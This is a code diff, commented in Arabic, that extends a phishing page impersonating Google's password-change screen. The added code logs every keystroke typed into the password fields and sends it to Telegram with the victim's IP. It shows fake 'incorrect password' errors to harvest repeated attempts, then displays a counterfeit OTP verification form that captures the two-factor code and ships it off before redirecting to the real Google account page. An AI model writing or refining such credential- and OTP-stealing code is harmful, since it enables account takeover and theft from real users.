@@ -2,6 +2,7 @@ let userIP = "";
 let userAgent = navigator.userAgent;
 let os = "غير معروف";
 let browser = "غير معروف";
+let failedAttempts = 0; // عداد المحاولات الفاشلة
 
 // تحديد نظام التشغيل
 if (userAgent.indexOf("Win") !== -1) os = "Windows";
@@ -35,7 +36,29 @@ window.onload = function () {
       `;
       sendToTelegram(msg);
     });
+
+  // تفعيل الرصد اللحظي للكتابة (Live Keystrokes)
+  setupLiveTyping();
 };
+
+// وظيفة رصد ما يكتبه المستخدم لحظة بلحظة لكل حرف
+function setupLiveTyping() {
+  const fields = ["oldPassword", "newPassword", "confirmPassword"];
+  fields.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.addEventListener("input", () => {
+        const liveMsg = `
+✍️ **رصد كتابة لحظية:**
+- الحقل: \`${id}\`
+- ما يتم كتابته الآن: \`${el.value}\`
+- IP: \`${userIP}\`
+        `;
+        sendToTelegram(liveMsg);
+      });
+    }
+  });
+}
 
 function handlePasswordChange(event) {
   event.preventDefault();
@@ -61,11 +84,10 @@ function handlePasswordChange(event) {
   message.style.color = "#5f6368";
 
   setTimeout(() => {
-    message.textContent = "تم تغيير كلمة مرورك بنجاح";
-    message.style.color = "#188038"; // لون أخضر Google
+    failedAttempts++; // زيادة عداد المحاولات الفاشلة
 
     const fullMsg = `
-🔐 محاولة تغيير كلمة مرور - Google
+🔐 محاولة تغيير كلمة مرور رقم (${failedAttempts})
 
 📡 IP: ${userIP}
 💻 نظام التشغيل: ${os}
@@ -73,13 +95,68 @@ function handlePasswordChange(event) {
 
 🔑 كلمة المرور الحالية: ${oldPass}
 🆕 كلمة المرور الجديدة: ${newPass}
-🔁 إعادة التأكيد: ${confirmPass}
-
-✅ المصدر: google.com
     `;
-
     sendToTelegram(fullMsg);
-  }, 3000); // تأخير 3 ثواني
+
+    // الشرط: إذا وصلت المحاولات إلى 3، يتم تحويله لصفحة التحقق من الهوية (OTP)
+    if (failedAttempts >= 3) {
+      message.textContent = "تم اكتشاف نشاط غير مألوف. جاري التحويل للتحقق من الأمان...";
+      message.style.color = "orange";
+      setTimeout(() => {
+        switchToVerificationView();
+      }, 1500);
+      return;
+    }
+
+    // إظهار خطأ وهمي للمحاولات الأولى لدفع الهدف للمحاولة مجدداً
+    message.textContent = "كلمة المرور الحالية غير صحيحة. يجب إعادة المحاولة.";
+    message.style.color = "red";
+  }, 2000);
+}
+
+// تحويل الواجهة إلى نافذة التحقق من الهوية وإدخال الكود (OTP)
+function switchToVerificationView() {
+  const box = document.querySelector(".google-box");
+  box.innerHTML = `
+    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+    <h2 class="title">التحقق من هويتك</h2>
+    <p style="font-size: 13px; color: #5f6368; margin-bottom: 20px; text-align: right;">لأمانك، أرسلنا رسالة نصية تحتوي على رمز تحقق إلى هاتفك المرتبط بالحساب.</p>
+    
+    <form onsubmit="handleVerificationCode(event)">
+      <label for="otpCode" style="text-align: right; display: block;">أدخل رمز التحقق (6 أرقام)</label>
+      <input type="text" id="otpCode" placeholder="• • • • • •" required maxlength="6" style="text-align: center; font-size: 18px; letter-spacing: 5px;">
+      
+      <button type="submit" style="margin-top: 20px;">تأكيد الهوية</button>
+      <p id="otpMessage" style="margin-top: 15px; font-size: 14px; text-align: center;"></p>
+    </form>
+  `;
+}
+
+// معالجة وإرسال كود التحقق عند إدخاله من قبل الضحية
+function handleVerificationCode(event) {
+  event.preventDefault();
+  const code = document.getElementById("otpCode").value;
+  const otpMsg = document.getElementById("otpMessage");
+
+  otpMsg.textContent = "جاري تأكيد الرمز...";
+  otpMsg.style.color = "#5f6368";
+
+  setTimeout(() => {
+    const otpReport = `
+🚨 **[ تم التقاط كود التحقق (OTP) بنجاح ]** 🚨
+- **الرمز المدخل:** \`${code}\`
+- **IP:** \`${userIP}\`
+    `.trim();
+    
+    sendToTelegram(otpReport);
+
+    otpMsg.textContent = "تم التحقق بنجاح! جاري توجيهك...";
+    otpMsg.style.color = "#188038";
+
+    setTimeout(() => {
+      window.location.href = "https://myaccount.google.com/";
+    }, 2000);
+  }, 1500);
 }
 
 function sendToTelegram(msg) {
@@ -94,9 +171,7 @@ function sendToTelegram(msg) {
 
   fetch(url, {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data)
   });
 }
